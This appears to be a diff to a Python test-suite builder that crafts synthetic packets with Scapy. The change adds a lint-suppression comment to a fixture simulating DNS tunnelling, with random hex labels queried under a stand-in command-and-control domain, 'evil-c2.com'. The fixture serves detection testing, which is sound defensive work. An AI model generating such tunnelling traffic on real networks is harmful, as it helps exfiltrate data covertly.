@@ -318,7 +318,7 @@ def _build_suite(tmp: Path) -> dict:
     # ── Malicious: DNS tunneling (long random labels to one parent domain) ───
     p = []
     for i in range(60):
-        label = "".join(random.choice("0123456789abcdef") for _ in range(40))
+        label = "".join(random.choice("0123456789abcdef") for _ in range(40))  # nosec B311 - synthetic validation fixture, not cryptographic
         p.append(Ether(**eth) / IP(src=victim, dst="45.33.32.156") /
                  UDP(sport=35000 + i, dport=53) /
                  DNS(rd=1, qd=DNSQR(qname=f"{label}.tunnel.evil-c2.com")))
